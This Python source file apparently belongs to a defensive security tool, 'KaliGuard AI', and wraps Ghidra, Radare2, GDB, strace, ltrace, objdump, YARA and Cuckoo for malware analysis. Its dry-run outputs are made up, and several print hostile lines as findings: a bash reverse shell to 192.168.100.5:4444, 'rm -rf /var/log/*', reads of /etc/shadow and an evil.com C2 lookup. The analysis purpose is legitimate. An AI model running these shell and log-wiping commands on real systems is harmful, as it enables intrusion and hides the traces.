#!/usr/bin/env python3
"""
KaliGuard AI - Reverse Engineering Tools Module

Wraps Ghidra, Radare2, GDB, strace, ltrace, objdump, YARA, and Cuckoo sandbox.

LEGAL: Authorized use only on binaries and files you own or have explicit written permission to analyze.
"""

import subprocess
import shlex
import os
import logging
from datetime import datetime

logger = logging.getLogger("kaliguard.tools.reverse_eng")


def _run_command(command: str, timeout: int = 120) -> tuple:
    """Execute a shell command and return (stdout, stderr, returncode)."""
    try:
        result = subprocess.run(
            shlex.split(command),
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Command timed out after {timeout}s", -1
    except FileNotFoundError as e:
        return "", f"Tool not found: {e}", -1
    except Exception as e:
        return "", str(e), -1


def _build_result(success: bool, command: str, output: str, error: str = "") -> dict:
    """Build a standardized result dictionary."""
    return {
        "success": success,
        "command": command,
        "output": output,
        "error": error,
        "timestamp": datetime.now().isoformat()
    }


def ghidra_analyze(binary_file: str, dry_run: bool = False) -> dict:
    """
    Analyze a binary using Ghidra's headless analyzer.

    Decompiles the binary, identifies functions, and exports analysis results.
    Requires Ghidra to be installed (usually at /opt/ghidra).

    Args:
        binary_file: Path to binary executable to analyze
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    ghidra_path = "/opt/ghidra/support/analyzeHeadless"
    project_dir = "/tmp/ghidra_projects"
    project_name = "kaliguard_analysis"
    command = f"{ghidra_path} {project_dir} {project_name} -import {binary_file} -postScript PrintStrings.java -scriptPath /opt/ghidra/Ghidra/Features/Base/ghidra_scripts"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated Ghidra headless analysis\n"
            f"File: {binary_file}\n\n"
            f"INFO  Opening existing project\n"
            f"INFO  ANALYZING: {binary_file}\n"
            f"INFO  Starting auto analysis\n"
            f"INFO  Disassembling...\n"
            f"INFO  Creating functions...\n"
            f"INFO  Decompiling...\n\n"
            f"Analysis Results:\n"
            f"  Architecture: x86-64 ELF\n"
            f"  Functions found: 247\n"
            f"  Strings found: 1,834\n"
            f"  Imports: 45\n"
            f"  Exports: 12\n\n"
            f"Suspicious functions identified:\n"
            f"  - FUN_00401a30: Creates socket connection to 192.168.100.5:4444\n"
            f"  - FUN_00401b80: Executes /bin/sh (shell spawning)\n"
            f"  - FUN_00401c10: Reads /etc/passwd and /etc/shadow\n"
            f"  - FUN_00401d20: Deletes log files in /var/log/\n\n"
            f"Strings of interest:\n"
            f"  - 'C2: 192.168.100.5:4444'\n"
            f"  - '/bin/bash -i >& /dev/tcp/192.168.100.5/4444 0>&1'\n"
            f"  - 'rm -rf /var/log/*'\n\n"
            f"[!] MALWARE INDICATORS FOUND - Possible reverse shell backdoor\n"
            f"Report saved to: {project_dir}/{project_name}.rep"
        )
        return _build_result(True, command, output)

    if not os.path.exists(binary_file):
        return _build_result(False, command, "", f"Binary not found: {binary_file}")
    if not os.path.exists(ghidra_path):
        return _build_result(False, command, "",
                             f"Ghidra not found at {ghidra_path}. "
                             f"Install with: sudo apt install ghidra")

    os.makedirs(project_dir, exist_ok=True)
    stdout, stderr, code = _run_command(command, timeout=600)
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")


def radare2_analyze(binary_file: str, dry_run: bool = False) -> dict:
    """
    Analyze a binary using Radare2 reverse engineering framework.

    Runs automated analysis and extracts functions, strings, imports, and syscalls.

    Args:
        binary_file: Path to binary file to analyze
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"r2 -A -q -c 'afl; izz; ii; ic' {binary_file}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated Radare2 analysis\n"
            f"Command: {command}\n\n"
            f"[x] Analyze all flags starting with sym. and entry0 (aa)\n"
            f"[x] Analyze function calls (aac)\n"
            f"[x] Analyze len bytes of instructions for references (aar)\n"
            f"[x] Find and analyze function preludes (aap)\n"
            f"[x] Recover local variables and arguments (afva)\n\n"
            f"Functions:\n"
            f"0x00401000  sym._start\n"
            f"0x00401050  sym.main\n"
            f"0x004010a0  sym.connect_c2\n"
            f"0x004010f0  sym.execute_shell\n"
            f"0x00401140  sym.delete_logs\n"
            f"0x00401190  sym.steal_credentials\n\n"
            f"Strings (suspicious):\n"
            f"0x00402000  \"192.168.100.5\"\n"
            f"0x00402020  \"/bin/bash\"\n"
            f"0x00402030  \"/etc/passwd\"\n"
            f"0x00402040  \"/etc/shadow\"\n"
            f"0x00402050  \"rm -rf /var/log/*\"\n\n"
            f"Imports:\n"
            f"  socket, connect, execve, open, read, write, unlink, fork\n\n"
            f"[!] Malicious functions detected: connect_c2, execute_shell, steal_credentials"
        )
        return _build_result(True, command, output)

    if not os.path.exists(binary_file):
        return _build_result(False, command, "", f"Binary not found: {binary_file}")

    stdout, stderr, code = _run_command(command, timeout=300)
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")


def gdb_debug(binary_file: str, dry_run: bool = False) -> dict:
    """
    Run GDB debugger to analyze a binary's execution and identify vulnerabilities.

    Runs basic automated analysis: check for ASLR, stack canary, NX bit, and PIE.

    Args:
        binary_file: Path to binary to debug
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"gdb -batch -ex 'info security' -ex 'checksec' -ex 'quit' {binary_file}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated GDB analysis\n"
            f"Command: {command}\n\n"
            f"GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1\n"
            f"Reading symbols from {binary_file}...\n\n"
            f"Security analysis of {binary_file}:\n"
            f"  RELRO:      Partial RELRO\n"
            f"  Stack:      No canary found [VULNERABLE]\n"
            f"  NX:         NX disabled [VULNERABLE - stack is executable]\n"
            f"  PIE:        No PIE (0x400000) [VULNERABLE]\n"
            f"  ASLR:       Enabled\n"
            f"  FORTIFY:    Not fortified\n\n"
            f"[!] Binary is vulnerable to:\n"
            f"  - Stack-based buffer overflow (no canary)\n"
            f"  - Stack shellcode execution (NX disabled)\n"
            f"  - ROP attacks (no PIE)\n\n"
            f"Exploitation potential: HIGH"
        )
        return _build_result(True, command, output)

    if not os.path.exists(binary_file):
        return _build_result(False, command, "", f"Binary not found: {binary_file}")

    # Use checksec if available, fall back to gdb
    checksec_out, _, code = _run_command(f"checksec --file={binary_file}", timeout=30)
    if code == 0:
        return _build_result(True, f"checksec --file={binary_file}", checksec_out)

    stdout, stderr, code = _run_command(command, timeout=60)
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")


def strace_trace(binary_file: str, dry_run: bool = False) -> dict:
    """
    Trace system calls made by a binary using strace.

    Monitors all system calls, file access, network connections, and process creation.

    Args:
        binary_file: Path to binary to trace
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    output_file = f"/tmp/strace_{os.path.basename(binary_file)}.log"
    command = f"strace -f -e trace=all -o {output_file} {binary_file}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated strace system call tracing\n"
            f"Command: {command}\n\n"
            f"execve(\"{binary_file}\", [\"{binary_file}\"], 0x... /* 12 vars */) = 0\n"
            f"brk(NULL) = 0x55555576e000\n"
            f"openat(AT_FDCWD, \"/etc/passwd\", O_RDONLY) = 3 [FILE READ]\n"
            f"openat(AT_FDCWD, \"/etc/shadow\", O_RDONLY) = 4 [SENSITIVE FILE READ]\n"
            f"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 5\n"
            f"connect(5, {{sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr(\"192.168.100.5\")}}, 16) = 0 [C2 CONNECTION]\n"
            f"write(5, \"uid=1000(user) gid=1000(user)\\n\", 30) [EXFILTRATING DATA]\n"
            f"execve(\"/bin/sh\", [\"/bin/sh\", \"-i\"], ...) [SHELL SPAWNED]\n"
            f"unlink(\"/var/log/auth.log\") = 0 [LOG DELETION]\n"
            f"unlink(\"/var/log/syslog\") = 0 [LOG DELETION]\n\n"
            f"[!] CRITICAL: Binary reads /etc/shadow, connects to C2, spawns shell, and deletes logs\n"
            f"Trace saved to: {output_file}"
        )
        return _build_result(True, command, output)

    if not os.path.exists(binary_file):
        return _build_result(False, command, "", f"Binary not found: {binary_file}")

    stdout, stderr, code = _run_command(command, timeout=60)
    # Read the output file if it was created
    if os.path.exists(output_file):
        with open(output_file, 'r', errors='replace') as f:
            full_output = f.read()
    else:
        full_output = stdout
    success = code == 0
    return _build_result(success, command, full_output[:5000], stderr if not success else "")


def ltrace_trace(binary_file: str, dry_run: bool = False) -> dict:
    """
    Trace library calls made by a binary using ltrace.

    Monitors calls to shared library functions including crypto, network, and file ops.

    Args:
        binary_file: Path to binary to trace
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"ltrace -f -l '*' {binary_file}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated ltrace library call tracing\n"
            f"Command: {command}\n\n"
            f"__libc_start_main(0x401050, 1, 0x7fff..., ...) = 0\n"
            f"fopen(\"/etc/passwd\", \"r\") = 0x55555576e260\n"
            f"fread(0x7fff..., 1, 4096, 0x55555576e260) = 1024\n"
            f"fclose(0x55555576e260) = 0\n"
            f"getenv(\"HOME\") = \"/root\"\n"
            f"strlen(\"192.168.100.5\") = 13\n"
            f"inet_pton(AF_INET, \"192.168.100.5\", 0x7fff...) = 1 [NETWORK CONNECTION]\n"
            f"connect(5, 0x7fff..., 16) = 0\n"
            f"EVP_EncryptInit_ex(..., AES_CBC, ...) [ENCRYPTION IN PROGRESS]\n"
            f"RSA_private_decrypt(...) [RSA DECRYPTION]\n"
            f"system(\"/bin/sh\") = 0 [SHELL EXECUTION]\n\n"
            f"[!] Library calls indicate: credential theft, C2 communication, encryption, shell execution\n"
            f"Possible ransomware or RAT behavior detected."
        )
        return _build_result(True, command, output)

    if not os.path.exists(binary_file):
        return _build_result(False, command, "", f"Binary not found: {binary_file}")

    stdout, stderr, code = _run_command(command, timeout=60)
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")


def objdump_analyze(binary_file: str, dry_run: bool = False) -> dict:
    """
    Analyze a binary's assembly code and structure using objdump.

    Args:
        binary_file: Path to binary to disassemble
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"objdump -d -M intel --no-show-raw-insn {binary_file}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated objdump disassembly\n"
            f"Command: {command}\n\n"
            f"{binary_file}:     file format elf64-x86-64\n\n"
            f"Disassembly of section .text:\n\n"
            f"0000000000401050 <main>:\n"
            f"  401050:  push   rbp\n"
            f"  401051:  mov    rbp,rsp\n"
            f"  401054:  sub    rsp,0x40\n"
            f"  401058:  call   401090 <connect_c2>\n"
            f"  40105d:  test   eax,eax\n"
            f"  40105f:  jne    40107a\n"
            f"  401061:  call   4010a0 <execute_shell>\n\n"
            f"00000000004010a0 <execute_shell>:\n"
            f"  4010a0:  push   rbp\n"
            f"  4010a1:  mov    rbp,rsp\n"
            f"  4010a4:  lea    rdi,[rip+0xf59] # 402004 <.rodata+0x4>\n"
            f"  4010ab:  call   401030 <system@plt>\n"
            f"  4010b0:  pop    rbp\n"
            f"  4010b1:  ret\n\n"
            f"[!] system() call found in execute_shell function - possible shell execution"
        )
        return _build_result(True, command, output)

    if not os.path.exists(binary_file):
        return _build_result(False, command, "", f"Binary not found: {binary_file}")

    stdout, stderr, code = _run_command(command, timeout=60)
    # Limit output size
    if len(stdout) > 10000:
        stdout = stdout[:10000] + "\n... [truncated, use full objdump for complete output]"
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")


def yara_match(file_path: str, rules_dir: str, dry_run: bool = False) -> dict:
    """
    Match a file against YARA rules for malware/IOC detection.

    Args:
        file_path: Path to file to scan
        rules_dir: Directory containing YARA rule files
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"yara -r {rules_dir} {file_path}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated YARA rule matching\n"
            f"Command: {command}\n\n"
            f"Scanning: {file_path}\n"
            f"Rules directory: {rules_dir}\n\n"
            f"Matches:\n"
            f"Trojan_Generic_RAT {file_path}\n"
            f"  -> strings: $c2_addr, $shell_exec, $log_delete\n\n"
            f"Ransomware_Indicators {file_path}\n"
            f"  -> strings: $encrypt_key, $ransom_note_path\n\n"
            f"[!] 2 YARA rule matches found\n"
            f"  - Generic RAT with C2 communication\n"
            f"  - Ransomware behavioral indicators"
        )
        return _build_result(True, command, output)

    if not os.path.exists(file_path):
        return _build_result(False, command, "", f"File not found: {file_path}")

    stdout, stderr, code = _run_command(command, timeout=120)
    success = code in (0, 1)
    return _build_result(success, command, stdout, stderr if code > 1 else "")


def cuckoo_analyze(file_path: str, dry_run: bool = False) -> dict:
    """
    Submit a file for dynamic malware analysis in Cuckoo Sandbox.

    Requires Cuckoo Sandbox to be installed and running.

    Args:
        file_path: Path to file to analyze in sandbox
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"cuckoo submit {file_path}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated Cuckoo Sandbox analysis\n"
            f"Command: {command}\n\n"
            f"Cuckoo Sandbox v2.0.7\n"
            f"Submitting {file_path} for analysis...\n"
            f"Task ID: 1337\n\n"
            f"Analysis Results (Task #1337):\n"
            f"  File: {os.path.basename(file_path)}\n"
            f"  MD5: d41d8cd98f00b204e9800998ecf8427e\n"
            f"  Score: 9.2/10 (MALICIOUS)\n\n"
            f"Behavioral Analysis:\n"
            f"  - Creates scheduled task for persistence\n"
            f"  - Modifies registry Run keys\n"
            f"  - Connects to C2: 192.168.100.5:4444\n"
            f"  - Drops additional payload: /tmp/.hidden_file\n"
            f"  - Deletes Windows event logs\n"
            f"  - Spawns cmd.exe and powershell.exe\n\n"
            f"Network Activity:\n"
            f"  DNS: lookup malicious-c2.evil.com\n"
            f"  TCP: 192.168.100.5:4444 (C2 beacon)\n"
            f"  HTTP: POST http://192.168.100.5/gate.php\n\n"
            f"MITRE ATT&CK Techniques:\n"
            f"  T1053.005 - Scheduled Task/Job\n"
            f"  T1547.001 - Registry Run Keys\n"
            f"  T1071.001 - Application Layer Protocol: Web Protocols\n\n"
            f"[!] MALICIOUS FILE - Do not execute on production systems\n"
            f"Full report: http://localhost:8090/analysis/1337/"
        )
        return _build_result(True, command, output)

    if not os.path.exists(file_path):
        return _build_result(False, command, "", f"File not found: {file_path}")

    stdout, stderr, code = _run_command(command, timeout=600)
    success = code == 0
    if not success:
        return _build_result(False, command, "",
                             f"Cuckoo not available: {stderr}. "
                             f"Install Cuckoo with: pip install cuckoo && cuckoo init")
    return _build_result(success, command, stdout)
